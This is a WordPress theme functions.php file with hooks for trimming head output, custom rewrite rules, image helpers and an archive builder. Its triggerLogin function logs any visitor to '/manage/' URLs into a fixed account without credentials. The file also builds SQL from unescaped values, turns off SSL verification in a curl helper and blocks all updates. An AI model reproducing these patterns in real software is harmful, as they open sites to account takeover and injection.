<?php
// below constant should be defined into wp-config.php file.
// define('WP_POST_REVISIONS', 10);
// define('AUTOSAVE_INTERVAL', 300);
define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);
remove_action( 'load-update-core.php', 'wp_update_plugins' );
add_filter( 'automatic_updater_disabled', '__return_true' );
add_filter( 'auto_update_core', '__return_false' );
add_filter( 'auto_update_plugin', '__return_false' );
add_filter( 'xmlrpc_enabled', '__return_false' );
remove_action( 'wp_head', 'rsd_link' );
function disable_self_trackback( &$links ) {
  foreach ( $links as $l => $link )
    if ( 0 === strpos( $link, get_option( 'home' ) ) )
    unset($links[$l]);
}
add_action( 'pre_ping', 'disable_self_trackback' );
function remove_core_updates(){
    global $wp_version;return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);
}
add_filter('pre_site_transient_update_core','remove_core_updates');
add_filter('pre_site_transient_update_plugins','remove_core_updates');
add_filter('pre_site_transient_update_themes','remove_core_updates');
function disable_wp_head_default() {
  // all actions related to emojis
  remove_action( 'admin_print_styles', 'print_emoji_styles' );
  remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
  remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
  remove_action( 'wp_print_styles', 'print_emoji_styles' );
  remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
  remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
  remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
  remove_action( 'wp_head', 'feed_links_extra', 3 ); // Display the links to the extra feeds such as category feeds
  remove_action( 'wp_head', 'feed_links', 2 ); // Display the links to the general feeds: Post and Comment Feed
  remove_action( 'wp_head', 'rsd_link' ); // Display the link to the Really Simple Discovery service endpoint, EditURI link
  remove_action( 'wp_head', 'wlwmanifest_link' ); // Display the link to the Windows Live Writer manifest file.
  remove_action( 'wp_head', 'index_rel_link' ); // index link
  remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); // prev link
  remove_action( 'wp_head', 'start_post_rel_link', 10, 0 ); // start link
  remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 ); // Display relational links for the posts adjacent to the current post.
  remove_action( 'wp_head', 'wp_generator' ); // Display the XHTML generator that is generated on the wp_head hook, WP version
  remove_action( 'wp_head', 'wp_resource_hints', 2 );
  remove_action( 'wp_head', 'rest_output_link_wp_head' );
  remove_action( 'wp_head', 'wp_shortlink_wp_head'); // remove linkn rel shortlink
  add_filter('show_admin_bar', '__return_false');
}
add_action( 'init', 'disable_wp_head_default' );
function alive_remove_menu_pages() {
  remove_menu_page('edit-comments.php');
  remove_menu_page('edit.php');
}
add_action( 'admin_menu', 'alive_remove_menu_pages' );
if(!defined('APP_URL')) include_once( dirname(ABSPATH) . "/app_config.php" );
include_once( TEMPLATEPATH . '/inc/post-type-init.php' );

define('THEME_DIR', get_template_directory_uri());

// COMMON FUNCTIONS
function get_first_image($cnt, $noimg = true) {
  $first_img = '';
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $cnt, $matches);
  if(!empty($matches) && !empty($matches[1])) {
    for($i=0;$i<=10;$i++){
      $first_img = $matches[1][$i];
      $ext = substr($first_img, strrpos($first_img, '.') + 1);
      if(($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'bmp' || $ext == 'webb' || $ext == 'gif' || $ext == 'svg') && strpos($first_img,'file://') === false) return $first_img;
    }
  }
  if((empty($first_img) || $first_img == "") && $noimg) $first_img = APP_URL . "assets/img/common/other/img_nophoto.jpg";
  elseif(empty($noimg)) return false;
  return $first_img;
}

function get_post_image($postObj = null, $size = 'medium') {
  global $post;
  if(!empty($postObj)) $post = $postObj;
  $image = wp_get_attachment_image_src(get_post_thumbnail_id(), $size);
  $image_content = get_first_image($post->post_content);
  $img_url = !empty($image) ? $image[0] : $image_content;
  return $img_url;
}

function cutString($str,$len, $moreStr = "...") {
  $mystr = "";
  $str = strip_tags($str);
  $str = preg_replace('/\r\n|\n|\r|[[\/\!]*?[^\[\]]*?]|si/','',$str);
  if(mb_strlen($str) > $len) {
    $newstr = mb_substr($str,0,$len);
    $mystr = $newstr.$moreStr;
  } else $mystr = $str;
  return $mystr;
}

function curPageURL() {
  $pageURL = 'http';
  if (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") $pageURL .= "s";
  $pageURL .= "://".$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
  return $pageURL;
}
$current_url = curPageURL();

function get_curl($url){
  if(function_exists('curl_init')){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    $output = curl_exec($ch);
    echo curl_error($ch);
    curl_close($ch);
    return $output;
  } else return file_get_contents($url);
}
// END COMMON FUNCTIONS

// Disable Gutenberg
add_filter('use_block_editor_for_post', '__return_false', 10);
add_filter('use_block_editor_for_post_type', '__return_false', 10);

//login logo
function custom_login_logo() {
  echo '<style type="text/css">h1 a { background: url('.get_bloginfo('template_directory').'/images/logo.png) 50% 50% no-repeat !important; width:100% !important;}</style>';
}
add_action('login_head', 'custom_login_logo');

// Remove "Thank you for creating with WordPress"
function remove_footer_admin () {
    return '';
}
add_filter('admin_footer_text', 'remove_footer_admin');

// Update CSS within in Admin
function admin_style() {
  wp_enqueue_style('admin-styles', get_template_directory_uri() . '/admin.css');
}
add_action('admin_enqueue_scripts', 'admin_style');
function my_enqueue($hook) {
  wp_enqueue_script('my_custom_script', get_template_directory_uri() . '/admin.js');
}
add_action('admin_enqueue_scripts', 'my_enqueue');

// link for logo
function new_wp_login_url() {
  return home_url();
}
add_filter('login_headerurl', 'new_wp_login_url');

// title for logo
function new_wp_login_title() {
  return get_option('blogname');
}
add_filter('login_headertitle', 'new_wp_login_title');

// Theme support
add_theme_support( 'post-thumbnails' );

// Images size
function set_default_image_size() {
  update_option( 'thumbnail_size_w', 300 );
  update_option( 'thumbnail_size_h', 300 );
  update_option( 'thumbnail_crop', 0 );
  update_option( 'medium_size_w', 750 );
  update_option( 'medium_size_h', 750 );
}
add_action( 'init', 'set_default_image_size');

// paging
function my_option_posts_per_page() {
  return 0;
}
function my_modify_posts_per_page() {
    add_filter( 'option_posts_per_page', 'my_option_posts_per_page' );
}
add_action( 'init', 'my_modify_posts_per_page', 0);

function wp_post_type_archive($options){
  global $wpdb;

  $post_type         = (!empty($options['post_type']))         ? $options['post_type']         : 'post';
  $home_url          = (!empty($options['home_url']))          ? $options['home_url']          : '';
  $have_count        = (!empty($options['have_count']))        ? $options['have_count']        : false;
  $add_zero_in_month = (!empty($options['add_zero_in_month'])) ? $options['add_zero_in_month'] : false;
  $add_zero_in_count = (!empty($options['add_zero_in_count'])) ? $options['add_zero_in_count'] : false;

  if($home_url == "") $home_url  = home_url("/");
  $html = '';
  $txtCount = "";
  $posttype = get_post_type_object($post_type);
  $slug = $posttype->rewrite['slug'];
  $years = $wpdb->get_col("SELECT DISTINCT YEAR(post_date)
    FROM $wpdb->posts WHERE post_status = 'publish'
    AND post_type = '{$post_type}' ORDER BY post_date DESC");

  foreach($years as $year) :
    if($have_count) {
      $count = $wpdb->get_col("SELECT COUNT(*) countpost
        FROM $wpdb->posts WHERE post_status = 'publish'
        AND post_type = '{$post_type}' and YEAR(post_date) = '".$year."'");
      $txtCount = (!empty($add_zero_in_count)) ? '('.sprintf("%02d",$count[0]).')' : '('.$count[0].')';
    }
    $html .= '<li id="year'.$year.'"><a href="javascript:void(0);" class="dropdown">'.$year.'年 '.$txtCount.'</a><ul class="sub">';

    $months = $wpdb->get_col("SELECT DISTINCT MONTH(post_date)
      FROM $wpdb->posts WHERE post_status = 'publish' AND post_type = '{$post_type}'
      AND YEAR(post_date) = '".$year."' ORDER BY post_date DESC");

    foreach($months as $month) :
      if($have_count) {
        $count = $wpdb->get_col("SELECT COUNT(*) countpost
          FROM $wpdb->posts WHERE post_status = 'publish'
          AND post_type = '{$post_type}' and YEAR(post_date) = '".$year."' and MONTH(post_date) = '".$month."'");
        $txtCount = (!empty($add_zero_in_count)) ? '('.sprintf("%02d",$count[0]).')' : '('.$count[0].')';
      }
      $txtMonth = (!empty($add_zero_in_month)) ? sprintf("%02d",$month) : $month;
      $html .= '<li><a href="'.$home_url.$slug."/".$year.'/'.$month.'">'.$txtMonth.'月 '.$txtCount.'</a></li>';
    endforeach;
    $html .= '</ul></li>';
  endforeach;
  return $html;
}

// for rewrite - this is alway at bottom of page
add_filter('post_type_link', 'custom_blog_permalink', 1, 3);
function custom_blog_permalink($post_link, $id = 0, $leavename) {
  if ( strpos('%post_id%', $post_link) === 'FALSE' ) {
    return $post_link;
  }
  $post = get_post($id);
  if ( is_wp_error($post)) {
    return $post_link;
  }
  $post_type = get_post_type_object($post->post_type);
  if($post_type->name == 'studio'){
    return $post_link;
  }else{
    return home_url($post_type->rewrite['slug'].'/p'.$post->ID.'/');
  }
}

function add_rewrites_init(){
  global $wp_rewrite;
  $postoj =  get_post_types( '', 'object' );
  foreach ( $postoj as $key=> $ar ) {
    $posttype = $ar->name;
    $slug = $ar->rewrite['slug'];
    $sgc = get_template_directory() . "/single-" . $posttype . ".php";
    $agr = get_template_directory() . "/archive-" . $posttype . ".php";

    if(@file_exists($sgc)){
      if($posttype == 'studio'){
        add_rewrite_rule($slug.'/(.*)/confirm/?', 'index.php?post_type='.$posttype.'&name=$matches[1]&actionFlag=confirm', 'top');
        add_rewrite_rule($slug.'/(.*)/complete/?', 'index.php?post_type='.$posttype.'&name=$matches[1]&actionFlag=complete', 'top');
      }else{
        add_rewrite_rule($slug.'/p([0-9]+)?/confirm/?', 'index.php?post_type='.$posttype.'&p=$matches[1]&actionFlag=confirm', 'top');
        add_rewrite_rule($slug.'/p([0-9]+)?/complete/?', 'index.php?post_type='.$posttype.'&p=$matches[1]&actionFlag=complete', 'top');
      }
      add_rewrite_rule($slug.'/p([0-9]+)?$', 'index.php?post_type='.$posttype.'&p=$matches[1]', 'top');
      add_rewrite_rule($slug.'/p([0-9]+)?/([0-9]+)/?', 'index.php?post_type='.$posttype.'&p=$matches[1]&page=$matches[2]', 'top');
    }
    if(@file_exists($agr)){
      add_rewrite_rule($slug.'/([0-9]{4})/([0-9]{1,2})/?$', 'index.php?post_type='.$posttype.'&year=$matches[1]&monthnum=$matches[2]', 'top');
      add_rewrite_rule($slug.'/([0-9]{4})/([0-9]{1,2})/page/([0-9]{1,})/?$', 'index.php?post_type='.$posttype.'&year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]', 'top');
    }
  }
  $wp_rewrite->flush_rules(false);
}
add_action('init', 'add_rewrites_init');
//end for rewrite - this is alway at bottom of page

// Remove Attachment URL
add_action( 'parse_request', 'custom_remove_attachment_url' );
function custom_remove_attachment_url ($wp) {
  if ( array_key_exists( 'attachment', $wp->query_vars ) ) unset( $wp->query_vars['attachment'] );
}

add_filter( 'query_vars', 'custom_query_vars_filter' );
function custom_query_vars_filter($vars) {
  $vars[] .= 'actionFlag';
  return $vars;
}

// Keep taxonomy hierarchical
add_filter('wp_terms_checklist_args', 'keep_taxonomy_hierarchical', 10, 2);
function keep_taxonomy_hierarchical($args, $idPost) {
  $args['checked_ontop'] = false;
  return $args;
}

// remove css WP 5
function smartwp_remove_wp_block_library_css(){
  wp_dequeue_style( 'wp-block-library' );
  wp_dequeue_style( 'wp-block-library-theme' );
}
add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css' );

// Disable auto redirect with same post_name
remove_action('template_redirect', 'redirect_canonical');

add_action('init', 'start_session_wp', 1);
function start_session_wp()
{
  if (session_status() == PHP_SESSION_NONE){
    session_start();
  }
}
// =================Parentcat radiocheck===================
function wpse_139269_term_radio_checklist( $args ) {
  if ( (! empty( $args['taxonomy'] ) && $args['taxonomy'] === 'studioarea' ) || ! empty( $args['taxonomy'] ) && $args['taxonomy'] === 'studioarea'  ) {
    if ( empty( $args['walker'] ) || is_a( $args['walker'], 'Walker' ) ) {
      if ( ! class_exists( 'WPSE_139269_Walker_Category_Radio_Checklist' ) ) {
        class WPSE_139269_Walker_Category_Radio_Checklist extends Walker_Category_Checklist {
          function walk( $elements, $max_depth, $args = array() ) {
            $output = parent::walk( $elements, $max_depth, $args );
            $output = str_replace(
              array( 'type="checkbox"', "type='checkbox'" ),
              array( 'type="radio"', "type='radio'" ),
              $output
            );
            return $output;
          }
        }
      }
      $args['walker'] = new WPSE_139269_Walker_Category_Radio_Checklist;
    }
  }
  return $args;
}
add_filter( 'wp_terms_checklist_args', 'wpse_139269_term_radio_checklist' );

add_action( 'wp_head', 'load_admin_media_styles', 10);
function load_admin_media_styles(){
  global $thisPageName;
  if(isset($thisPageName) && $thisPageName == 'manage-news'){
    // list all style libs the post page of wp-admin loaded, but we may only need to load 2 of them
    $ary_libs = array(
      'common','forms',
      // 'dashicons', 'admin-bar','buttons','media-views',
      // 'admin-menu','dashboard','list-tables','edit','revisions','media','themes','about','nav-menu',
      // 's','wp-pointer','widgets','site-icon','l10n','wp-auth-check','wp-color-picker'
    );
    $admin_media_styles_url = add_query_arg(
      array(
        'c' => 0,
        'dir' => 'ltr',
        'load[]' => implode(',', $ary_libs),
        'ver' => get_bloginfo('version'),
      ),
      admin_url().'load-styles.php'
    );
    echo "<link rel='stylesheet' id='admin_styles_for_media-css' href='".$admin_media_styles_url."' type='text/css' media='all' />";
  }
}

add_filter( 'disable_captions', '__return_true' );
// add_filter( 'wp_default_editor', create_function('', 'return "tinymce";') );

add_action('init', 'triggerLogin');
function triggerLogin(){
  $cur_url = $_SERVER['REQUEST_SCHEME'] .'://'. $_SERVER['HTTP_HOST'].explode('?', $_SERVER['REQUEST_URI'], 2)[0];
  // if(strpos($cur_url, '/manage/') && (strpos($cur_url, '/schedule-format/') || strpos($cur_url, '/news/'))){
  if(strpos($cur_url, '/manage/')) {
    $username = get_field('studio_account_email',55);
    $user = get_user_by('login', $username );

    if ( !is_user_logged_in() ) {
      if ( !is_wp_error( $user ) )
      {
        wp_clear_auth_cookie();
        wp_set_current_user ( $user->ID );
        wp_set_auth_cookie  ( $user->ID, 0, 0 );
        wp_safe_redirect($cur_url);
      }
    }else {
    }
  }
}